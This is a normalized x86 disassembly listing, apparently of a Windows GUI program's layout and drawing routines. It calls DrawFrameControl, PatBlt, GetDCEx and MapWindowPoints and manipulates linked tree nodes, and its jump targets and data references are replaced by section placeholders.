cmp eax [ ebp - 0x18 ]
jge r-xdata
mov [ esi + 0x8 ] ebx
mov [ ebx + 0x14 ] esi
jmp r-xdata
mov eax esi
mov edi [ ebp - 0x18 ]
sub edi [ ebp - 0x14 ]
test edi edi
jle r-xdata
mov [ eax + 0xc ] ebx
mov [ ebx + 0x18 ] eax
mov eax [ eax + 0x14 ]
mov [ ebx + 0x14 ] eax
mov [ ebp - 0x1c ] 0x1
mov eax [ eax + 0x14 ]
inc [ ebp - 0x1c ]
dec edi
jne r-xdata
sub_450908
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov esi edx
mov ebx eax
push 0x0
push 0x1
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edi [ eax + 0x18 ]
mov eax edi
add eax esi
sub eax 0x2
push eax
lea eax [ ebp - 0x10 ]
push eax
mov eax [ ebp + 0x8 ]
mov ecx edi
add ecx ebx
sub ecx 0x2
mov edx esi
mov eax ebx
call sub_41a018
lea eax [ ebp - 0x10 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_427d50
push eax
call DrawFrameControl
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_450960
push ebp
mov ebp esp
push ebx
push esi
push edi
mov esi ecx
mov ebx edx
mov edi eax
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x10 ]
mov edx 0xff000014
call sub_427328
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x4 ]
mov ecx ebx
mov edx esi
call sub_427a84
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x4 ]
mov ecx ebx
mov edx edi
call sub_427a24
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x4 ]
mov ecx [ ebp + 0x8 ]
mov edx edi
call sub_427a24
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x10 ]
mov edx 0xff000010
call sub_427328
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x4 ]
mov ecx [ ebp + 0x8 ]
mov edx esi
call sub_427a24
mov ecx ebx
dec ecx
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x4 ]
mov edx esi
call sub_427a24
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
sub_4509e8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
mov ebx [ ebp + 0x8 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x14 ]
mov al [ eax + 0x5b ]
dec eax
sub al 0x2
jae r-xdata
push ebp
mov eax [ ebx + 0x8 ]
mov edx [ ebp - 0x8 ]
sub eax [ edx + 0x18 ]
inc eax
mov edx [ ebx + 0x4 ]
inc edx
call sub_450908
pop ecx
push ebp
mov eax [ ebx + 0x4 ]
mov edx eax
add edx 0x5
push edx
mov ecx [ ebx + 0x8 ]
mov edx [ ebp - 0x8 ]
sub ecx [ edx + 0x18 ]
sub ecx 0x2
mov edx eax
add edx 0x3
mov eax [ ebx ]
add eax 0x2
call sub_450960
pop ecx
push ebp
mov eax [ ebx + 0x4 ]
mov edx eax
add edx 0x8
push edx
mov ecx [ ebx + 0x8 ]
mov edx [ ebp - 0x8 ]
sub ecx [ edx + 0x18 ]
sub ecx 0x2
mov edx eax
add edx 0x6
mov eax [ ebx ]
add eax 0x2
call sub_450960
pop ecx
push ebp
mov edx [ ebx + 0x4 ]
inc edx
mov eax [ ebx ]
inc eax
call sub_450908
pop ecx
push ebp
mov edx [ ebx + 0xc ]
sub edx 0x2
push edx
mov edx [ ebx + 0x4 ]
mov ecx [ ebp - 0x8 ]
add edx [ ecx + 0x18 ]
inc edx
mov eax [ ebx ]
mov ecx eax
add ecx 0x5
add eax 0x3
call sub_450960
pop ecx
push ebp
mov edx [ ebx + 0xc ]
sub edx 0x2
push edx
mov edx [ ebx + 0x4 ]
mov ecx [ ebp - 0x8 ]
add edx [ ecx + 0x18 ]
inc edx
mov eax [ ebx ]
mov ecx eax
add ecx 0x8
add eax 0x6
call sub_450960
pop ecx
jmp r-xdata
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
sub_450ac4
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
mov ebx edx
mov esi eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_427758
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_450c1a
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ esi + 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_445b60
mov eax [ ebp - 0x4 ]
call sub_427a5c
xor eax eax
push ebp
push sub_450bfd
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_427dd0
xor eax eax
push ebp
push sub_450be0
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ esi + 0x14 ]
call sub_44a49c
dec eax
test eax eax
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_450be7
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_427dd0
retn
inc eax
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0x0
inc [ ebp - 0x8 ]
dec [ ebp - 0xc ]
jne r-xdata
mov eax [ ebx + 0xa0 ]
cmp eax [ esi + 0x14 ]
jne r-xdata
mov eax [ esi + 0x14 ]
mov edx [ ebp - 0x8 ]
call sub_44a460
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
lea edx [ ebp - 0x1c ]
mov eax ebx
call sub_446924
lea ecx [ ebp - 0x1c ]
mov edx ebx
mov eax esi
mov edi [ eax ]
call [ edi ]
mov eax [ ebp - 0x1c ]
sub eax [ ebx + 0x40 ]
add eax eax
sub [ ebp - 0x1c ] eax
mov eax [ ebp - 0x18 ]
sub eax [ ebx + 0x44 ]
add eax eax
sub [ ebp - 0x18 ] eax
mov eax [ ebx + 0x48 ]
mov edx [ ebp - 0x14 ]
sub edx [ ebp - 0x1c ]
sub eax edx
add eax eax
sub [ ebp - 0x14 ] eax
mov eax [ ebx + 0x4c ]
mov edx [ ebp - 0x10 ]
sub edx [ ebp - 0x18 ]
sub eax edx
add eax eax
sub [ ebp - 0x10 ] eax
lea eax [ ebp - 0x1c ]
push eax
mov ecx ebx
mov edx [ ebp - 0x4 ]
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x10 ]
sub_450c28
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
mov ebx ecx
mov esi eax
mov eax [ esi + 0x14 ]
call sub_44c29c
mov edi eax
test ebx ebx
je r-xdata
mov eax [ esi + 0x14 ]
call sub_4469cc
push eax
lea eax [ ebp - 0x1c ]
push eax
mov eax [ esi + 0x14 ]
call sub_446988
mov ecx eax
xor edx edx
xor eax eax
call sub_41a018
mov eax [ ebp + 0x8 ]
push esi
push edi
lea esi [ ebp - 0x1c ]
mov edi eax
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
pop esi
test edi edi
jle r-xdata
cmp [ ebx + 0x9c ] 0x0
je r-xdata
push 0x2
mov eax [ ebp + 0x8 ]
push eax
push 0x0
mov eax [ esi + 0x14 ]
call sub_44d7a4
push eax
call MapWindowPoints
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov al [ ebp + 0xc ]
dec al
je r-xdata
cmp edi 0x2
jge r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0xc ]
sar eax 0x1
jns r-xdata
dec al
je r-xdata
mov eax [ ebx + 0x40 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebx + 0x44 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebx + 0x48 ]
mov edi eax
mov edx [ ebx + 0x4c ]
mov [ ebp - 0xc ] edx
mov dl [ ebp + 0xc ]
add dl 0xfd
sub dl 0x2
jae r-xdata
mov edx [ ebp + 0x8 ]
mov [ edx + 0xc ] eax
jmp r-xdata
adc eax 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0xc ]
sar eax 0x1
jns r-xdata
dec al
je r-xdata
mov al [ ebp + 0xc ]
dec eax
sub al 0x2
jae r-xdata
mov edi eax
sar edi 0x1
jns r-xdata
mov edx [ ebp + 0x8 ]
mov [ edx + 0x4 ] eax
jmp r-xdata
adc eax 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
sar eax 0x1
jns r-xdata
dec al
je r-xdata
mov al [ ebp + 0xc ]
sub al 0x2
je r-xdata
mov eax [ ebx + 0x4c ]
sar eax 0x1
jns r-xdata
adc edi 0x0
jmp r-xdata
mov edx [ ebp + 0x8 ]
mov [ edx + 0x8 ] eax
jmp r-xdata
adc eax 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
sar eax 0x1
jns r-xdata
jmp r-xdata
mov eax [ ebp - 0xc ]
add [ ebp - 0x8 ] eax
sub al 0x2
jne r-xdata
mov [ ebp - 0xc ] eax
adc eax 0x0
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
jmp r-xdata
adc eax 0x0
mov eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x1c ]
push eax
mov ecx edi
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_41a040
mov eax [ ebp + 0x8 ]
push esi
lea esi [ ebp - 0x1c ]
mov edi eax
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
add [ ebp - 0x4 ] edi
jmp r-xdata
sub_450d9c
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ ebx + 0xc ]
test eax eax
je r-xdata
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
mov edx [ ebp + 0x8 ]
push edx
call sub_450d9c
pop ecx
mov eax ebx
call sub_403390
pop ebx
pop ebp
retn
mov edx [ ebp + 0x8 ]
push edx
call sub_450d9c
pop ecx
sub_450dd0
push ebp
mov ebp esp
push ebx
push esi
mov ebx edx
mov esi eax
test ebx ebx
je r-xdata
pop esi
pop ebx
pop ebp
retn
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
mov eax [ ebx + 0x18 ]
test eax eax
je r-xdata
push ebp
call sub_450d9c
pop ecx
mov eax [ ebx + 0x14 ]
test eax eax
je r-xdata
mov edx [ ebx + 0xc ]
mov [ eax + 0xc ] edx
jmp r-xdata
mov eax [ ebx + 0xc ]
test eax eax
je r-xdata
mov edx [ ebx + 0xc ]
mov [ eax + 0x8 ] edx
cmp ebx [ esi + 0x64 ]
jne r-xdata
mov edx [ ebx + 0x18 ]
mov [ eax + 0x18 ] edx
mov eax ebx
call sub_403390
xor eax eax
mov [ esi + 0x64 ] eax
sub_450e2c
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_44fe3c
test eax eax
je r-xdata
pop esi
pop ebx
retn
cmp eax [ ebx + 0x38 ]
jne r-xdata
mov edx eax
mov eax ebx
call sub_450e68
xor edx edx
mov [ eax + 0x4 ] edx
jmp r-xdata
mov [ esi + 0x9c ] 0x0
mov eax [ ebx + 0x14 ]
mov edx [ eax ]
call [ edx + 0x7c ]
sub_450e68
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
push edi
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_4510d5
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
jne r-xdata
cmp [ ebx + 0x4 ] 0x0
jne r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_406030
lea eax [ ebp - 0x4 ]
push eax
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_406030
mov edx [ ebp - 0x8 ]
pop eax
call sub_4043e8
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bc44
call sub_403b5c
mov eax [ ebx + 0x14 ]
call sub_44f5c8
cmp eax 0x1
jne r-xdata
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_406030
lea eax [ ebp - 0xc ]
push eax
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_406030
mov edx [ ebp - 0x10 ]
pop eax
call sub_4043e8
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bc44
call sub_403b5c
cmp eax 0x2
jne r-xdata
mov eax [ esi + 0x64 ]
xor edx edx
mov [ eax + 0x8 ] edx
mov [ eax + 0x10 ] 0x0
jmp r-xdata
mov eax [ ebx + 0x18 ]
test eax eax
jne r-xdata
mov eax [ ebx + 0x18 ]
test eax eax
jne r-xdata
mov eax ebx
call sub_403390
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4510dc
lea eax [ ebp - 0x10 ]
mov edx 0x4
call sub_404144
retn
mov edx [ ebx + 0xc ]
mov [ eax + 0xc ] edx
mov edx [ ebx + 0xc ]
test edx edx
je r-xdata
mov eax [ ebx + 0x14 ]
mov edx [ ebx + 0xc ]
mov [ eax + 0x8 ] edx
mov eax [ ebx + 0xc ]
xor edx edx
mov [ eax + 0x18 ] edx
call sub_44f978
jmp r-xdata
mov edi eax
mov edi [ ebx + 0xc ]
jmp r-xdata
mov eax ebx
call sub_44faf0
mov edx eax
mov eax [ ebx + 0x18 ]
call sub_44fb2c
mov eax [ ebx + 0x18 ]
call sub_44f978
mov [ edx + 0x18 ] eax
push esi
push sub_451678
mov edx [ ebx + 0x14 ]
mov eax esi
call sub_44fea4
mov eax [ ebx + 0x14 ]
cmp eax [ esi + 0x64 ]
jne r-xdata
mov edx [ esi + 0x64 ]
mov eax [ ebx + 0x14 ]
cmp edx eax
jne r-xdata
cmp [ edi + 0x4 ] 0x0
je r-xdata
mov eax [ ebx + 0x14 ]
mov eax [ eax + 0x18 ]
mov edx [ edi + 0x8 ]
mov [ edx + 0x18 ] eax
test eax eax
jne r-xdata
mov edx [ esi + 0x68 ]
mov eax edi
call sub_44fb2c
mov eax [ esi + 0x64 ]
call sub_44faf0
mov [ esi + 0x68 ] eax
mov eax [ esi + 0x64 ]
call sub_403390
mov [ esi + 0x64 ] edi
xor eax eax
mov [ edi + 0xc ] eax
xor eax eax
mov [ edi + 0x18 ] eax
xor eax eax
mov [ edi + 0x14 ] eax
mov eax esi
call sub_451650
jmp r-xdata
mov [ eax + 0x10 ] 0x0
mov edx [ edi + 0x4 ]
mov [ eax + 0x4 ] edx
xor edx edx
mov [ eax + 0x8 ] edx
mov eax edi
call sub_403390
mov eax [ esi + 0x64 ]
mov [ eax + 0x8 ] edi
xor eax eax
mov [ edi + 0x18 ] eax
xor eax eax
mov [ edi + 0xc ] eax
mov eax [ esi + 0x64 ]
call sub_44f674
mov edx eax
mov eax edi
call sub_44fb18
mov eax edi
call sub_44f978
jmp r-xdata
mov edx [ edi + 0x8 ]
mov [ eax + 0xc ] edx
mov eax [ edi + 0x8 ]
mov edx [ ebx + 0x14 ]
mov edx [ edx + 0x14 ]
mov [ edx + 0x8 ] eax
jmp r-xdata
push esi
push sub_451678
mov edx [ ebx + 0x14 ]
mov eax esi
call sub_44fea4
jmp r-xdata
mov eax [ eax + 0xc ]
mov edx [ ebx + 0x14 ]
mov edx [ edx + 0x14 ]
mov [ eax + 0x14 ] edx
cmp [ eax + 0xc ] 0x0
jne r-xdata
mov edx [ ebx + 0x14 ]
mov edx [ edx + 0xc ]
mov [ eax + 0xc ] edx
cmp [ eax + 0xc ] 0x0
je r-xdata
mov eax [ edi + 0x8 ]
mov edx [ ebx + 0x14 ]
mov edx [ edx + 0x14 ]
mov [ eax + 0x14 ] edx
push esi
push sub_451678
mov edx [ eax + 0x14 ]
mov eax esi
call sub_44fea4
mov eax [ ebx + 0x14 ]
call sub_403390
mov eax edi
call sub_403390
jmp r-xdata
mov edx [ eax + 0xc ]
mov [ edx + 0x18 ] eax
sub_4510e4
push ebx
push esi
push edi
add esp 0xfffffff0
mov ebx edx
mov edi eax
mov esi [ edi + 0x14 ]
test [ esi + 0x1c ] 0x1
jne r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
cmp [ edi + 0x64 ] 0x0
je r-xdata
mov eax esi
call sub_44c29c
test eax eax
jle r-xdata
mov edx esp
mov eax [ edi + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov edx esp
mov eax [ edi + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x8c ]
test bl bl
jne r-xdata
push edi
lea esi [ esp + 0x4 ]
add edi 0x1d
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
mov eax [ edi + 0x64 ]
mov dl [ eax + 0x10 ]
dec dl
je r-xdata
lea edx [ edi + 0x1d ]
mov eax esp
mov ecx 0x10
call sub_4081b0
test al al
jne r-xdata
mov edx [ esp + 0x8 ]
sub edx [ esp ]
call sub_44fb18
mov eax [ esp + 0xc ]
sub eax [ esp + 0x4 ]
mov [ edi + 0x68 ] eax
jmp r-xdata
dec dl
je r-xdata
mov eax [ edi + 0x14 ]
call sub_44c208
test eax eax
jle r-xdata
mov edx [ esp + 0xc ]
sub edx [ esp + 0x4 ]
call sub_44fb18
mov eax [ esp + 0x8 ]
sub eax [ esp ]
mov [ edi + 0x68 ] eax
jmp r-xdata
xor edx edx
mov eax edi
call sub_451500
cmp [ edi + 0x6c ] 0x0
jne r-xdata
push edi
push sub_451678
xor edx edx
mov eax edi
call sub_44fea4
sub_4511c0
push ebx
push esi
push ecx
mov ebx edx
mov esi eax
test ebx ebx
je r-xdata
pop edx
pop esi
pop ebx
retn
test ebx ebx
je r-xdata
mov eax [ ebx + 0x14 ]
mov al [ eax + 0x10 ]
cmp al [ esi + 0x48 ]
jne r-xdata
mov eax ebx
call sub_44faf0
mov [ esp ] eax
fild [ esp ]
fmul [ esi + 0x40 ]
call sub_402b60
mov edx eax
mov eax ebx
call sub_44fb18
sub_4511fc
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_4045d0
xor eax eax
push ebp
push sub_451267
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_4043e0
mov [ ebp - 0x8 ] eax
lea edx [ ebp - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx 0x4
mov ebx [ eax ]
call [ ebx + 0x10 ]
cmp [ ebp - 0x8 ] 0x0
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45126e
lea eax [ ebp - 0x4 ]
call sub_404120
retn
mov edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
sub_451274
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_451323
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx 0x4
mov esi [ eax ]
call [ esi + 0x10 ]
lea edx [ ebx + 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx 0x1
mov esi [ eax ]
call [ esi + 0x10 ]
lea edx [ ebx + 0x20 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx 0x4
mov esi [ eax ]
call [ esi + 0x10 ]
mov eax [ ebp + 0x8 ]
push eax
lea edx [ ebp - 0x8 ]
mov eax ebx
call sub_44f880
mov eax [ ebp - 0x8 ]
call sub_4511fc
pop ecx
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
mov eax [ ebx + 0xc ]
test eax eax
je r-xdata
mov edx [ ebp + 0x8 ]
push edx
mov edx [ ebp - 0x4 ]
inc edx
call sub_451274
pop ecx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45132a
lea eax [ ebp - 0x8 ]
call sub_404120
retn
mov edx [ ebp + 0x8 ]
push edx
mov edx [ ebp - 0x4 ]
call sub_451274
pop ecx
sub_451330
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_451469
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
lea edx [ eax + 0x70 ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_403360
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_451418
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x14 ]
call sub_44c208
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov eax [ ebp - 0x10 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov [ ebp - 0xc ] eax
lea edx [ ebp - 0xc ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
mov ebx [ ebp - 0xc ]
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45141f
mov eax [ ebp - 0x10 ]
call sub_403390
retn
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
cmp [ edi + 0x8 ] 0x0
je r-xdata
push ebp
lea ecx [ ebp - 0x14 ]
mov edx esi
mov eax [ ebp - 0x10 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0x14 ]
call sub_4511fc
pop ecx
inc esi
dec ebx
jne r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x14 ]
mov edx esi
call sub_44c21c
mov edi eax
cmp [ edi + 0x57 ] 0x0
jne r-xdata
mov edx [ edi + 0x8 ]
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
sub_45141f
mov eax [ ebp - 0x8 ]
lea edx [ eax + 0x68 ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
push ebp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x64 ]
xor edx edx
call sub_451274
pop ecx
mov edx rw-data
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_451470
lea eax [ ebp - 0x14 ]
call sub_404120
retn
sub_451478
push ebp
mov ebp esp
push ebx
push esi
mov ebx eax
test ebx ebx
je r-xdata
pop esi
pop ebx
pop ebp
retn
mov eax ebx
call sub_44fbc8
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_44fbf0
call sub_451478
pop ecx
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_44fbc8
call sub_451478
pop ecx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp ebx [ eax + 0x64 ]
je r-xdata
mov eax ebx
call sub_44f5f8
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x64 ]
mov esi [ ebx + 0x14 ]
cmp eax esi
jne r-xdata
mov eax [ esi + 0x14 ]
call sub_44faf0
mov edx eax
mov eax ebx
call sub_44fb18
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ eax + 0x68 ]
mov eax ebx
call sub_44fb18
jmp r-xdata
sub_451500
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
test edx edx
jne r-xdata
push ebp
mov eax edx
call sub_451478
pop ecx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov edx [ eax ]
call [ edx + 0x7c ]
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x64 ]
mov edx [ eax + 0x8 ]
sub_451544
push ebx
push esi
mov ebx edx
mov esi eax
test ebx ebx
je r-xdata
pop esi
pop ebx
retn
cmp ebx [ esi + 0x64 ]
je r-xdata
mov eax [ ebx + 0x14 ]
mov al [ eax + 0x10 ]
cmp al [ esi + 0x48 ]
jne r-xdata
mov eax ebx
call sub_44faf0
mov edx eax
add edx [ esi + 0x4c ]
mov eax ebx
call sub_44fb18
sub_451574
push ebx
push esi
push edi
add esp 0xfffffff8
mov esi ecx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx eax
mov [ ebx + 0x60 ] edx
mov eax [ ebx + 0x14 ]
call sub_44d7a4
mov edx eax
mov eax [ rw-data ]
call sub_4520d4
mov eax [ ebx + 0x14 ]
call sub_44d7a4
mov esi eax
mov [ ebx + 0x5c ] esi
push 0x412
push 0x0
push esi
call GetDCEx
mov [ ebx + 0x58 ] eax
mov eax [ esp ]
mov [ ebx + 0x50 ] eax
mov eax [ esp + 0x4 ]
mov [ ebx + 0x54 ] eax
mov eax ebx
call sub_451688
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
sub_4515d4
push ebx
mov ebx eax
xor edx edx
mov eax [ rw-data ]
call sub_4520d4
mov eax ebx
call sub_451688
mov eax [ ebx + 0x58 ]
push eax
mov eax [ ebx + 0x5c ]
push eax
call ReleaseDC
mov eax [ ebx + 0x60 ]
mov edx [ eax + 0x14 ]
cmp [ edx + 0x10 ] 0x1
jne r-xdata
mov edx [ ebx + 0xc ]
sar edx 0x1
jns r-xdata
mov edx [ ebx + 0xc ]
sar edx 0x1
jns r-xdata
add edx [ ebx + 0x50 ]
call sub_44fb18
adc edx 0x0
add edx [ ebx + 0x54 ]
call sub_44fb18
jmp r-xdata
adc edx 0x0
mov eax [ ebx + 0x60 ]
mov edx [ eax + 0x14 ]
mov eax ebx
call sub_451500
push ebx
push sub_451678
mov eax [ ebx + 0x60 ]
mov edx [ eax + 0x14 ]
mov eax ebx
call sub_44fea4
xor eax eax
mov [ ebx + 0x60 ] eax
pop ebx
retn
sub_451650
push ebx
mov ebx eax
cmp [ ebx + 0x6c ] 0x0
jne r-xdata
pop ebx
retn
mov eax [ ebx + 0x14 ]
call sub_44c208
test eax eax
jle r-xdata
push ebx
push sub_451678
xor edx edx
mov eax ebx
call sub_44fea4
sub_451688
push ebx
push esi
add esp 0xfffffff0
mov ebx eax
mov esi [ ebx + 0x60 ]
test esi esi
je r-xdata
add esp 0x10
pop esi
pop ebx
retn
mov eax [ esi + 0x14 ]
cmp [ eax + 0x10 ] 0x1
jne r-xdata
mov eax [ ebx + 0xc ]
sar eax 0x1
jns r-xdata
mov edx 0x2
mov eax esi
call sub_44f6bc
mov [ esp ] eax
mov eax [ ebx + 0xc ]
sar eax 0x1
jns r-xdata
mov edx [ ebx + 0x50 ]
sub edx eax
mov [ esp ] edx
mov edx 0x1
mov eax esi
call sub_44f6bc
mov [ esp + 0x4 ] eax
mov eax [ esp ]
add eax [ ebx + 0xc ]
mov [ esp + 0x8 ] eax
mov edx 0x1
mov eax [ ebx + 0x60 ]
call sub_44f728
add eax [ esp + 0x4 ]
mov [ esp + 0xc ] eax
adc eax 0x0
mov edx [ ebx + 0x54 ]
sub edx eax
mov [ esp + 0x4 ] edx
mov edx 0x2
mov eax [ ebx + 0x60 ]
call sub_44f728
add eax [ esp ]
mov [ esp + 0x8 ] eax
mov eax [ esp + 0x4 ]
add eax [ ebx + 0xc ]
mov [ esp + 0xc ] eax
jmp r-xdata
adc eax 0x0
mov eax [ ebx + 0x10 ]
call sub_42763c
push eax
mov eax [ ebx + 0x58 ]
push eax
call SelectObject
mov esi eax
push 0x5a0049
mov ecx [ esp + 0x10 ]
mov edx [ esp + 0x8 ]
sub ecx edx
push ecx
mov ecx [ esp + 0x10 ]
mov eax [ esp + 0x8 ]
sub ecx eax
push ecx
push edx
push eax
mov eax [ ebx + 0x58 ]
push eax
call PatBlt
push esi
mov eax [ ebx + 0x58 ]
push eax
call SelectObject
sub_451774
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx eax
mov eax [ ebp + 0x8 ]
cmp ebx [ eax - 0x4 ]
je r-xdata
mov eax [ ebx + 0xc ]
test eax eax
je r-xdata
mov eax [ ebx + 0x14 ]
mov al [ eax + 0x10 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov edx [ edx + 0x14 ]
cmp al [ edx + 0x10 ]
jne r-xdata
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
mov edx [ ebp + 0x8 ]
push edx
call sub_451774
pop ecx
mov eax ebx
call sub_44faf0
mov edi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_44faf0
cmp edi eax
jle r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
mov edx [ ebp + 0x8 ]
push edx
call sub_451774
pop ecx
cmp [ ebx + 0x4 ] 0x0
je r-xdata
mov eax ebx
call sub_44faf0
mov edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_42e3c0
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] eax
mov esi [ ebx + 0x4 ]
test esi esi
je r-xdata
cmp [ esi + 0x57 ] 0x0
je r-xdata
